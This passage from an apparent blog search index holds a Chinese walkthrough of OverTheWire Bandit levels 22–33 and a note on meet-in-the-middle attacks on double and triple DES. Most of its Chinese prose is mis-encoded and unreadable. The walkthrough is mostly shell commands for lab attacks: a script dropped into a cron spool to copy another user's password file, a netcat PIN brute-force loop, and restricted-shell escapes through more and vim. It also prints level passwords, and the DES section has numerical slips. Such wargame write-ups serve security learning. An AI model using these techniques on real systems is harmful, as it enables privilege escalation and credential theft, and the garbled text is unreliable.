è¾“çš„å®Œæ•´æ€§ï¼Œé˜²æ­¢æ–‡ä»¶è¢«äººç¯¡æ”¹ã€‚MD5 å…¨ç§°æ˜¯æŠ¥æ–‡æ‘˜è¦ç®—æ³•ï¼ˆMessage-Digest Algorithm 5ï¼‰ï¼Œæ­¤ç®—æ³•å¯¹ä»»æ„é•¿åº¦çš„ä¿¡æ¯é€ä½è¿›è¡Œè®¡ç®—ï¼Œäº§ç”Ÿä¸€ä¸ªäºŒè¿›åˆ¶é•¿åº¦ä¸º128ä½ï¼ˆåå…­è¿›åˆ¶é•¿åº¦å°±æ˜¯32ä½ï¼‰çš„â€œæŒ‡çº¹â€ï¼ˆæˆ–ç§°â€œæŠ¥æ–‡æ‘˜è¦â€ï¼‰ï¼Œä¸åŒçš„æ–‡ä»¶äº§ç”Ÿç›¸åŒçš„æŠ¥æ–‡æ‘˜è¦çš„å¯èƒ½æ€§æ˜¯éå¸¸éå¸¸ä¹‹å°çš„ã€‚ cutå‘½ä»¤ç”¨äºæ˜¾ç¤ºæ¯è¡Œä»å¼€å¤´ç®—èµ· num1 åˆ° num2 çš„æ–‡å­—ã€‚ cut å‘½ä»¤ä»æ–‡ä»¶çš„æ¯ä¸€è¡Œå‰ªåˆ‡å­—èŠ‚ã€å­—ç¬¦å’Œå­—æ®µå¹¶å°†è¿™äº›å­—èŠ‚ã€å­—ç¬¦å’Œå­—æ®µå†™è‡³æ ‡å‡†è¾“å‡ºã€‚ å¦‚æœä¸æŒ‡å®š File å‚æ•°ï¼Œcut å‘½ä»¤å°†è¯»å–æ ‡å‡†è¾“å…¥ã€‚å¿…é¡»æŒ‡å®š -bã€-c æˆ– -f æ ‡å¿—ä¹‹ä¸€ã€‚ Options: -b ï¼šä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ã€‚è¿™äº›å­—èŠ‚ä½ç½®å°†å¿½ç•¥å¤šå­—èŠ‚å­—ç¬¦è¾¹ç•Œï¼Œé™¤éä¹ŸæŒ‡å®šäº† -n æ ‡å¿—ã€‚ -c ï¼šä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ã€‚ -d ï¼šè‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºåˆ¶è¡¨ç¬¦ã€‚ -f ï¼šä¸-dä¸€èµ·ä½¿ç”¨ï¼ŒæŒ‡å®šæ˜¾ç¤ºå“ªä¸ªåŒºåŸŸã€‚ -n ï¼šå–æ¶ˆåˆ†å‰²å¤šå­—èŠ‚å­—ç¬¦ã€‚ä»…å’Œ -b æ ‡å¿—ä¸€èµ·ä½¿ç”¨ã€‚å¦‚æœå­—ç¬¦çš„æœ€åä¸€ä¸ªå­—èŠ‚è½åœ¨ç”± -b æ ‡å¿—çš„ List å‚æ•°æŒ‡ç¤ºçš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦å°†è¢«å†™å‡ºï¼›å¦åˆ™ï¼Œè¯¥å­—ç¬¦å°†è¢«æ’é™¤ 12345678910111213141516171819202122232425262728293031323334bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d &#x27; &#x27; -f 1)echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ whoamibandit22bandit22@bandit:/etc/cron.d$ ls -altotal 36drwxr-xr-x 2 root root 4096 Jul 11 2020 .drwxr-xr-x 87 root root 4096 May 14 2020 ..-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit15_root-rw-r--r-- 1 root root 62 Jul 11 2020 cronjob_bandit17_root-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22-rw-r--r-- 1 root root 122 May 7 2020 cronjob_bandit23-rw-r--r-- 1 root root 120 May 14 2020 cronjob_bandit24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit25_root-rw-r--r-- 1 root root 102 Oct 7 2017 .placeholderbandit22@bandit:/etc/cron.d$ echo I am user bandit23| md5sum8ca319486bfbbc3663ea0fbe81326349 -bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nbandit22@bandit:/etc/cron.d$ Descriptions: md5sum: æ˜¾ç¤ºæˆ–æ£€æŸ¥ MD5(128-bit) æ ¡éªŒå’Œ,è‹¥æ²¡æœ‰æ–‡ä»¶é€‰é¡¹ï¼Œæˆ–è€…æ–‡ä»¶å¤„ä¸ºâ€-â€œï¼Œåˆ™ä»æ ‡å‡†è¾“å…¥è¯»å–ã€‚echo -n : ä¸æ‰“å°æ¢è¡Œç¬¦ã€‚(æ³¨æ„: echo -n åé¢çš„-nå‚æ•°å¿…é¡»åŠ ä¸Š, è¿™æ ·ç®—å‡ºçš„å­—ç¬¦ä¸²çš„md5å€¼æ‰æ­£ç¡®)cut: cutç”¨æ¥ä»æ ‡å‡†è¾“å…¥æˆ–æ–‡æœ¬æ–‡ä»¶ä¸­å‰ªåˆ‡åˆ—æˆ–åŸŸã€‚å‰ªåˆ‡æ–‡æœ¬å¯ä»¥å°†ä¹‹ç²˜è´´åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚ -d æŒ‡å®šä¸ç©ºæ ¼å’Œtabé”®ä¸åŒçš„åŸŸåˆ†éš”ç¬¦ã€‚-f1 è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸã€‚ Level_23â¡Level_24Ez_shell_code 123456789101112131415161718#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;for i in * .*;do if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ]; then echo &quot;Handling $i&quot; owner=&quot;$(stat --format &quot;%U&quot; ./$i)&quot; if [ &quot;$&#123;owner&#125;&quot; = &quot;bandit23&quot; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fidone Analyse: shellè„šæœ¬åˆ†æï¼š é—´éš”æ—¶é—´æ‰§è¡Œ/var/spool/bandit24 ç›®å½•ä¸‹çš„æ–‡ä»¶ç„¶ååˆ é™¤ æˆ‘ä»¬ç¼–å†™ä¸ªshellè„šæœ¬è¾“å‡ºå³å¯ 12bandit23@bandit:/var/spool/bandit24$ vim fuck.shbandit23@bandit:/var/spool/bandit24$ chmod 777 fuck.sh fuck.sh 1cat /etc/bandit_pass/bandit24 &gt; /tmp/i_got_it 12bandit23@bandit:~$ cat /tmp/i_got_itUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level_24â¡Level_25basic_shell 123456789#! /bin/bashpass24=&quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot;nc localhost 30002for i in &#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;do echo $pass24&#x27; &#x27;$i &gt;&gt; dictdonecat ./dict | nc localhost 30002 &gt;&gt; resort re | uniq -u Level_25â¡Level_26Tips:The shell for user bandit26 is not /bin/bash æ ¹æ®æç¤ºæˆ‘ä»¬æŸ¥çœ‹bandit26çš„/etc/passwd æ–‡ä»¶ Learn about the passwd12345678910 passwdæ–‡ä»¶æ˜¯ä»¥è¡Œä¸ºå•ä½çš„é…ç½®æ–‡ä»¶ï¼Œæ¯è¡Œå®šä¹‰ç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç”¨æˆ·ï¼Œè¡Œå†…åˆ†ä¸ºå­—æ®µï¼Œå­—æ®µä¹‹é—´ç”±ä¸€ä¸ªå†’å·éš”å¼€ã€‚è¿™äº›å­—æ®µä¾æ¬¡ä¸ºï¼šç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šä¸»è¦ç»„IDï¼šGECOSï¼šä¸»ç›®å½•ï¼šç™»å½•shellå­—æ®µè§£é‡Šï¼šç”¨æˆ·åï¼šå°±æ˜¯ä¸€ä¸ªç”¨æˆ·åï¼Œç™»å½•æ—¶å€™ç”¨çš„å¯†ç ï¼šåœ¨æ—§çš„UNIXç³»ç»Ÿä¸Šï¼Œè¿™ä¸ªå­—æ®µå«æœ‰ç”¨æˆ·çš„åŠ å¯†å¯†ç ï¼Œä¸ºäº†å®‰å…¨æ€§ï¼Œç°åœ¨çš„linuxå‡æ˜¾ç¤ºä¸ºxæˆ–*å·ç”¨æˆ·IDï¼šlinuxå†…æ ¸ç”¨äºè¯†åˆ«ç”¨æˆ·çš„ä¸€ä¸ªæ•´æ•°IDä¸»è¦ç»„IDï¼šlinuxå†…æ ¸ç”¨äºè¯†åˆ«ç”¨æˆ·ä¸»è¦ç»„çš„ä¸€ä¸ªæ•´æ•°IDGECOSï¼šç”¨æˆ·å…¨åï¼Œå®‰è£…linuxæ—¶å¦‚æœä¸è¾“å…¥å…¨åï¼Œåˆ™æ˜¾ç¤ºä¸ºè·Ÿç”¨æˆ·åä¸€æ ·ï¼Œå¦‚æœè¾“å…¥ï¼Œåˆ™æ˜¾ç¤ºä¸ºå…¨åï¼ˆä¸å¯ç”¨äºç™»å½•ï¼‰ä¸»ç›®å½•ï¼šç”¨æˆ·ç™»å½•æ—¶ï¼Œä»–çš„ç™»å½•Shellå°†ä½¿ç”¨è¿™ä¸ªç›®å½•ä½œä¸ºå½“å‰å·¥ä½œç›®å½•ç™»å½•Shellï¼šç”¨æˆ·ç™»å½•æ—¶çš„é»˜è®¤Shellï¼Œåœ¨redhat ä¼ä¸šç‰ˆä¸­ï¼Œç™»å½•shellé€šå¸¸æ˜¯&#x2F;bin&#x2F;bash Three types of users: 123456 3ç§ç±»å‹çš„ç”¨æˆ·æ™®é€šç”¨æˆ·ï¼šæ™®é€šç”¨æˆ·æ˜¯ä½¿ç”¨ç³»ç»ŸçœŸå®ç”¨æˆ·äººç¾¤ã€‚æ™®é€šç”¨æˆ·é€šå¸¸æŠŠ&#x2F;bin&#x2F;bashä½œä¸ºç™»å½•Shellå’Œ&#x2F;homeçš„å­ç›®å½•ä½œä¸ºä¸»ç›®å½•ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ™®é€šç”¨æˆ·åªåœ¨è‡ªå·±çš„ä¸»ç›®å½•å’Œç³»ç»ŸèŒƒå›´å†…çš„ä¸´æ—¶ç›®å½•é‡Œï¼ˆå¦‚&#x2F;tmpå’Œ&#x2F;var&#x2F;tmpï¼‰åˆ›å»ºæ–‡ä»¶ã€‚åœ¨redhatä¼ä¸šç‰ˆlinuxä¸­ï¼Œæ™®é€šç”¨æˆ·çš„ç”¨æˆ·IDæ•°é€šå¸¸å¤§äº500. rootç”¨æˆ·ï¼šç”¨æˆ·IDä¸º0çš„ç”¨æˆ·ï¼Œä¹Ÿè¢«ç§°ä¸ºè¶…çº§ç”¨æˆ·ï¼Œrootç”¨æˆ·åœ¨ç³»ç»Ÿä¸Šæ‹¥æœ‰å®Œå…¨æƒé™ï¼Œå¯ä»¥ä¿®æ”¹å’Œåˆ é™¤ä»»ä½•æ–‡ä»¶ï¼Œå¯ä»¥è¿è¡Œä»»ä½•å‘½ä»¤ï¼Œå¯ä»¥å–æ¶ˆä»»ä½•è¿›ç¨‹ã€‚rootç”¨æˆ·è´Ÿè´£å¢åŠ å’Œä¿ç•™å…¶ä»–ç”¨æˆ·ã€é…ç½®ç¡¬ä»¶ã€æ·»åŠ ç³»ç»Ÿè½¯ä»¶ã€‚è™½ç„¶rootç”¨æˆ·å¯ä»¥åœ¨ç³»ç»Ÿä¸Šçš„ä»»ä½•åœ°æ–¹åˆ›å»ºæ–‡ä»¶ï¼Œä½†å®ƒä¹Ÿé€šå¸¸ä½¿ç”¨&#x2F;rootä½œä¸ºä¸»ç›®å½• ç³»ç»Ÿç”¨æˆ·ï¼šå¤§å¤šæ•°linuxç³»ç»Ÿä¿ç•™ä¸€ç³»åˆ—ä½UIDå€¼ç”¨æˆ·ä½œä¸ºç³»ç»Ÿç”¨æˆ·ï¼Œç³»ç»Ÿç”¨æˆ·ä¸ä»£è¡¨äººï¼Œè€Œä»£è¡¨ç³»ç»Ÿçš„ç»„æˆéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼Œè¿è¡ŒApacheç½‘ç»œæœåŠ¡å™¨çš„è¿›ç¨‹ç»å¸¸ä½œä¸ºç”¨æˆ·apacheï¼ˆ è§ä¸Šé¢çš„passwdæ–‡ä»¶ä¸­apacheç”¨æˆ·ä¿¡æ¯ï¼‰æ¥è¿è¡Œã€‚ç³»ç»Ÿç”¨æˆ·ä¸€èˆ¬æ²¡æœ‰ç™»å½•Shellï¼Œå› ä¸ºå®ƒä¸ä»£è¡¨å®é™…ç™»å½•çš„ç”¨æˆ·ã€‚åŒæ ·ï¼Œç³»ç»Ÿç”¨æˆ·çš„ä¸»ç›®å½•å¾ˆå°‘åœ¨&#x2F;homeä¸­ï¼Œè€Œé€šå¸¸åœ¨å±äºç›¸å…³åº”ç”¨çš„ç³»ç»Ÿç›®å½•ä¸­ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·apacheçš„ä¸»ç›®å½•æ˜¯&#x2F;var&#x2F;wwwã€‚åœ¨redhatä¼ä¸šç‰ˆlinuxä¸­ï¼Œç³»ç»Ÿç”¨æˆ·çš„UIDå€¼èŒƒå›´åœ¨1-499ä¹‹é—´ã€‚ 123456789bandit25@bandit:~$ cat /etc/passwd|grep bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit25@bandit:~$ cat /usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text.txtexit 0 å°†å‘½ä»¤çª—å£è°ƒæœ€å°è‡ªåŠ¨è§¦å‘moreï¼Œç„¶åä¿®æ”¹shellä¸ºbashå³å¯ 1234567# æŒ‰ä¸‹vé”®è¿›å…¥viç¼–è¾‘æ¨¡å¼ï¼Œç„¶åæ›´æ”¹shellä¸ºbashå³å¯:set shell sh=/bin/bash #vimå‘½ä»¤è®¾ç½®shell:sh #vimä¸­æ‰§è¡Œshellbandit26@bandit:~$ cat /etc/bandit_pass/bandit265czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z Level_26â¡Level_27å’Œä¸Šä¸€å…³å·®ä¸å¤šã€‚ 12:set shell=/bin/sh:sh è¿›å…¥å: 12bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit273ba3118a22e93127a4ed485be72ef5ea Level_27â¡Level_28Learn about Gitå‚é˜…é˜®ä¸€å³°è¿™ç¯‡ï¼š clink_me git clone å…‹éš†ä¸€ä¸ªé¡¹ç›®ï¼š 12345678bandit27@bandit:/tmp/what_a_fuck$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repobandit27@bandit:/tmp/what_a_fuck$ lsrepobandit27@bandit:/tmp/what_a_fuck$ cd repo/bandit27@bandit:/tmp/what_a_fuck/repo$ lsREADMEbandit27@bandit:/tmp/what_a_fuck/repo$ cat READMEThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 Level_28â¡Level_29å’Œä¸Šä¸€å…³å·®ä¸å¤šï¼Œä½†å¹¶æ²¡æœ‰ç›´æ¥ç»™flagï¼Œå¯ä»¥åˆ©ç”¨git log å‘½ä»¤æŸ¥çœ‹ä¿®æ”¹ä¿¡æ¯ï¼š 123456789101112131415161718bandit28@bandit:/tmp/what_a_fuck/repo$ git logcommit edd935d60906b33f0619605abd1689808ccdd5eeAuthor: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 fix info leak #ä¿®å¤ä¿¡æ¯æ³„éœ²commit c086d11a00c0648d095d04c089786efef5e01264Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 add missing data #æ·»åŠ ç¼ºå°‘çš„ä¿¡æ¯commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 initial commit of README.md #æœ€åˆçš„ä¿¡æ¯ å¾ˆæ˜æ˜¾æ¯”è¾ƒä¿®å¤ä¿¡æ¯æ³„éœ²çš„æäº¤å’Œä¸Šä¸€ä¸ªæäº¤å³å¯ 1234567891011bandit28@bandit:/tmp/what_a_fuck/repo$ git diff c086 edd9diff --git a/README.md b/README.mdindex 3f7cee8..5c6457b 100644--- a/README.md+++ b/README.md@@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29-- password: bbc96594b4e001778eee9975372716b2+- password: xxxxxxxxxx Level_29â¡Level_30Learn about branch of git:å®˜æ–¹æ–‡æ¡£ï¼šyyds :)é˜…è¯»å®˜æ–¹æ–‡æ¡£çš„æ—¶å€™è‹±è¯­çš„ä½œç”¨å°±ä½“ç°å‡ºæ¥äº† 12345678910111213141516171819202122232425262728293031323334353637383940bandit29@bandit:/tmp/what_a_fuck/repo$ git branch -a #æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯* master remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-devbandit29@bandit:/tmp/what_a_fuck/repo$ git checkout dev #åˆ‡æ¢åˆ°å…¶ä»–åˆ†æ”¯Switched to branch &#x27;dev&#x27;bandit29@bandit:/tmp/what_a_fuck/repo$ git logcommit bc833286fca18a3948aec989f7025e23ffc16c07Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:52 2020 +0200 add data needed for development #è¯¥åˆ†æ”¯ä¸‹å¯èƒ½æœ‰flagcommit 8e6c203f885bd4cd77602f8b9a9ea479929ffa57Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 add gif2asciicommit 208f463b5b3992906eabf23c562eda3277fea912Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 fix usernamecommit 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:51 2020 +0200 initial commit of README.mdbandit29@bandit:/tmp/what_a_fuck/repo$ cat README.md #æŸ¥çœ‹READM.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: 5b90576bedb2cc04c86a9e924ce42faf Level_30â¡Level_31Learn about the git show1git show-ref #æ˜¾ç¤ºæ‰€æœ‰æœ¬åœ°åº“å‚¨å­˜çš„æ‰€æœ‰å¯èƒ½çš„å¼•ç”¨ä»¥åŠå…³è”çš„æé†’ 1234563aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/masterf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secretgit show f171å³å¯get flag47e603bb428404d265f59c42920d81e5 Level_31â¡Level_32Learn about push and commit of git1234567bandit31@bandit:/tmp/sanshiyiguan/repo$ cat README.md This time your task is to push a file to the remote repository.Details: File name: key.txt Content: &#x27;May I come in?&#x27; Branch: master æŸ¥çœ‹ä¿¡æ¯åº”è¯¥æ˜¯è®©æˆ‘ä»¬ç”¨masteråˆ†æ”¯æŠŠåŒ…å«â€™May I come in?â€™çš„key.txtæäº¤åˆ°è¿œç¨‹ä»“åº“ vim ç¼–è¾‘è¯¥æ–‡æ¡£ç„¶åæ·»åŠ  1git add key.txt -f å…³äº commit 1git commit -m &quot;wuhu~I_got_it&quot; The last step: 1git push 12remote: Well done! Here is the password for the next level:remote: 56a9bf19c63d650ce78e6ec0354ee45e Level_32â¡Level_33Analyse: 1234&gt;&gt; lssh: 1: LS: not found&gt;&gt; whoamish: 1: WHOAMI: not found ç™»å½•åå¼¹å‡ºä¸€ä¸ªå¤§å†™çš„SHELLç»ˆç«¯ï¼Œæµ‹è¯•å‘ç°æˆ‘ä»¬æ‰€æœ‰çš„å‘½ä»¤éƒ½ä¼šè¢«è½¬æ¢ä¸ºå¤§å†™ã€‚ æ ¹æ®Tips: sh å’Œ man æŸ¥é˜…man shæ–‡æ¡£ æ‰¾åˆ°äº†ä¸€äº›ä¿¡æ¯ï¼Œå¯ä»¥ç”¨$0 12345Expands to the name of the shell or shell script. This is set at shell initialization. If bash is invoked with a file of commands, $0 is set to the name of that file. If bash is started with the -c option, then $0 is set to the first argument after the string to be executed, if one is present. Otherwise, it is set to the file name used to invoke bash, as given by argument zero. Whatâ€™s $01In bash, $n (where â€œnâ€ represents a number), refers to the nth argument of a command call. $1 would be the first parameter, $2 the second, and so forth. $0 refers to the command itself. As we figured out above that our input is passed on to an sh call, $0 will be referencing sh itself, starting a new shell (without the UPPERCASE mechanics). 12$ cat /etc/bandit_pass/bandit33c9c3199ddf4121b10cf581a98d51caee Summaryé¢˜ç›®éå¸¸å¹³æ˜“è¿‘äººï¼Œå¼•å¯¼ç€å­¦ä¹ åŸºæœ¬Linuxå‘½ä»¤ã€linuxæ–‡ä»¶ã€ç”¨æˆ·ç®¡ç†ç­‰ã€Gitå‘½ä»¤ç­‰çŸ¥è¯†ã€‚","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"ä¸­é—´ç›¸é‡æ”»å‡»åˆ†æ","slug":"cryp_ä¸­é—´ç›¸é‡æ”»å‡»","date":"2021-04-06T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/07/cryp_ä¸­é—´ç›¸é‡æ”»å‡»/","link":"","permalink":"http://example.com/2021/04/07/cryp_%E4%B8%AD%E9%97%B4%E7%9B%B8%E9%81%87%E6%94%BB%E5%87%BB/","excerpt":"","text":"ä¸­é—´ç›¸é‡æ”»å‡» - MITMWhatâ€™s MITMä¸­é—´ç›¸é‡æ”»å‡»(Meet-in-the-middle attack):ä¸­é—´ç›¸é‡æ”»å‡»æ˜¯ä¸€ç§ä»¥ç©ºé—´æ¢å–æ—¶é—´çš„ä¸€ç§æ”»å‡»æ–¹æ³•ï¼Œ1977 å¹´ç”± Diffie ä¸ Hellman æå‡ºã€‚ä»ä¸ªäººè§’åº¦çœ‹ï¼Œè¿™æ›´å¤šåœ°æŒ‡ä¸€ç§æ€æƒ³ï¼Œä¸ä»…ä»…é€‚ç”¨äºå¯†ç å­¦æ”»å‡»ï¼Œä¹Ÿé€‚ç”¨äºå…¶ä»–æ–¹é¢ï¼Œå¯ä»¥é™ä½ç®—æ³•çš„å¤æ‚åº¦ã€‚ åŸºæœ¬åŸç†å‡è®¾ E å’Œ D åˆ†åˆ«æ˜¯åŠ å¯†å‡½æ•°å’Œè§£å¯†å‡½æ•°ï¼Œk1 å’Œ k2 åˆ†åˆ«æ˜¯ä¸¤æ¬¡åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œåˆ™æˆ‘ä»¬æœ‰ï¼š C=E_{k2}(E_{k1}(P)) P=D_{k2}(D_{k1}(C))åˆ™æˆ‘ä»¬å¯ä»¥æ¨å‡º E_{k1}(P)=D_{k2}(C)é‚£ä¹ˆï¼Œå½“ç”¨æˆ·çŸ¥é“ä¸€å¯¹æ˜æ–‡å’Œå¯†æ–‡æ—¶ æ”»å‡»è€…å¯ä»¥æšä¸¾æ‰€æœ‰çš„ k1ï¼Œå°† P æ‰€æœ‰åŠ å¯†åçš„ç»“æœå­˜å‚¨èµ·æ¥ï¼Œå¹¶æŒ‰ç…§å¯†æ–‡çš„å¤§å°è¿›è¡Œæ’åºã€‚ æ”»å‡»è€…è¿›ä¸€æ­¥æšä¸¾æ‰€æœ‰çš„ k2ï¼Œå°†å¯†æ–‡ C è¿›è¡Œè§£å¯†å¾—åˆ° C1ï¼Œåœ¨ç¬¬ä¸€æ­¥åŠ å¯†åçš„ç»“æœä¸­æœç´¢ C1ï¼Œå¦‚æœæœç´¢åˆ°ï¼Œåˆ™æˆ‘ä»¬åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥è®¤ä¸ºæˆ‘ä»¬æ‰¾åˆ°äº†æ­£ç¡®çš„ k1 å’Œ k2ã€‚ å¦‚æœè§‰å¾—ç¬¬äºŒæ­¥ä¸­å¾—åˆ°çš„ç»“æœä¸ä¿é™©ï¼Œåˆ™æˆ‘ä»¬è¿˜å¯ä»¥å†æ‰¾ä¸€äº›æ˜å¯†æ–‡å¯¹è¿›è¡ŒéªŒè¯ã€‚ ä¸‹é¢ä»¥åŒé‡DESã€ä¸‰é‡DESä¸ºä¾‹è¿›è¡Œä¸­é—´ç›¸é‡åˆ†æ Double-DES_Analyseæ€»å¯†é’¥é•¿åº¦ä¸€å…±2Ã—56ä½ ç©·ä¸¾æœç´¢å¤æ‚åº¦ï¼š 2^{112}ä¸‹é¢è€ƒè™‘ä¸­é—´ç›¸é‡æ”»å‡»å¤æ‚åº¦åˆ†æï¼š å¯¹äºç»™å®šæ˜æ–‡Pï¼Œå¯†æ–‡Cï¼Œå¯†é’¥K1,K2ï¼š E_{k1}(P)=D_{k2}(C)=M é¦–å…ˆPæŒ‰ç…§æ‰€æœ‰å¯èƒ½çš„k1è¿›è¡ŒåŠ å¯†å¾—åˆ°Mï¼Œå¯ä»¥å¾—åˆ°2^{64}ä¸ªç»“æœï¼Œå°†ç»“æœæŒ‰åºå­˜æ”¾ä¸€ä¸ªè¡¨ä¸­ç„¶åå°†Cç”¨æ‰€æœ‰å¯èƒ½çš„å¯†é’¥K2è§£å¯†ï¼Œæ¯è§£å¯†ä¸€æ¬¡ï¼Œå°†è§£å¯†ç»“æœä¸è¡¨ä¸­çš„å€¼æ¯”è¾ƒï¼Œå¦‚æœç”±ç›¸ç­‰çš„ï¼Œå°±å°†åˆšæ‰æµ‹è¯•çš„ä¸¤ä¸ªå¯†é’¥å¯¹ä¸€ä¸ªæ–°çš„æ˜å¯†æ–‡å¯¹è¿›è¡ŒéªŒè¯ï¼Œè‹¥éªŒè¯æˆåŠŸï¼Œåˆ™è®¤å®šè¿™ä¸¤ä¸ªå¯†é’¥å¯¹æ˜¯æ­£ç¡®çš„å¯†é’¥ã€‚ ç»“è®ºï¼šä¸­é—´ç›¸é‡æ”»å‡»ä½¿ç”¨ä¸¤ç»„å·²çŸ¥æ˜å¯†æ–‡å¯¹å°±å¯ä»¥çŒœå‡ºæ­£ç¡®çš„å¯†é’¥ï¼Œå…¶æ—¶é—´å¤æ‚åº¦æ˜¯2^56ï¼Œæ¯”å•é‡DESæ‰€éœ€çš„2^55æ¬¡æ–¹å¤šä¸äº†å¤šå°‘ã€‚ Treple-DES_Analyse3TDEA ä¸‰å¯†é’¥ä¸‰é‡DESï¼š C=E_{k3}(E_{k2}(E_{k1}(P))) P=D_{k3}(D_{k2}(D_{k1}(C))) ç©·ä¸¾æ”»å‡»å¤æ‚åº¦:2^{56Ã—3}ä¸‹é¢è€ƒè™‘ä¸­é—´ç›¸é‡æ”»å‡»ï¼š D_{k3}(C)=E_{k2}(E_{k1}(P))=MåŒç†ï¼šç©·ä¸¾k3è§£å¯†Cå¾—åˆ°è¡¨é¡¹ï¼Œç©·ä¸¾k1,k2è§£å¯†På…±2^{112}ç§å¯èƒ½ ä¸‰å¯†é’¥ä¸‰é‡DESä¸­é—´ç›¸é‡æ”»å‡»æ˜¯æœ‰æ•ˆçš„ 2TDEA åŒå¯†é’¥ä¸‰é‡DESï¼š C=E_{k1}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k1}(C))) ç©·ä¸¾æ”»å‡»å¤æ‚åº¦ï¼š2^{56Ã—2}ä¸‹é¢è€ƒè™‘ä¸­é—´ç›¸é‡æ”»å‡»ï¼š D_{k1}(C)=D_{k2}(E_{k1}(P))=MåŒç†ï¼šç©·ä¸¾k1è§£å¯†Cå¾—åˆ°è¡¨é¡¹ï¼Œç©·ä¸¾k1,k2è§£å¯†På…±2^{112}ç§å¯èƒ½ ä¸ç©·ä¸¾æ”»å‡»å¤æ‚åº¦ä¸€æ ·ï¼Œå› æ­¤å¯¹äºåŒå¯†é’¥ä¸‰é‡DESï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºä¸­é—´ç›¸é‡æ”»å‡»æ˜¯æ— æ•ˆçš„ã€‚ CTF_å¯¹åº”é¢˜ç›® 2018 å›½èµ› Crackmecï¼Œå‚è§ Wiki AES éƒ¨åˆ† 2018 Plaid CTF Transducipherï¼Œå‚è§æ¯”ç‰¹æ”»å‡»éƒ¨åˆ†çš„åŸç†ã€‚ 2018 å›½èµ› Crackme javaï¼Œå‚è§ Wiki æ•´æ•°åŸŸä¸Šçš„ç¦»æ•£å¯¹æ•°éƒ¨åˆ† 2018 WCTF RSAï¼Œå‚è§ wiki RSA Complex éƒ¨åˆ†","categories":[{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"}],"tags":[{"name":"MITM","slug":"MITM","permalink":"http://example.com/tags/MITM/"},{"name":"triple-DES","slug":"triple-DES","permalink":"http://example.com/tags/triple-DES/"},{"name":"double-DES","slug":"double-DES","permalink":"http://example.com/tags/double-DES/"}]},{"title":"æµå¯†ç 